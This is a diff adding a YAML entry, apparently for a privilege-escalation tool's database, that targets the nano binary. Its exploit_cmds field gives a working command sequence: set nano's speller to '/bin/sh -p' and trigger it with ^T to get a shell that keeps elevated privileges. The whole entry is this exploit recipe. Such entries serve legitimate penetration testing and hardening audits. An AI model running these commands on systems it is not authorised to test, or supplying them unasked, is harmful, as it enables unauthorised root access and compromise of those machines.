@@ -1,0 +1,8 @@
+name: nano
+binary_path: /usr/bin/nano
+exploit_cmds:
+- '/usr/bin/nano -s ''/bin/sh -p''
+
+  /bin/sh -p
+
+  ^T^T'
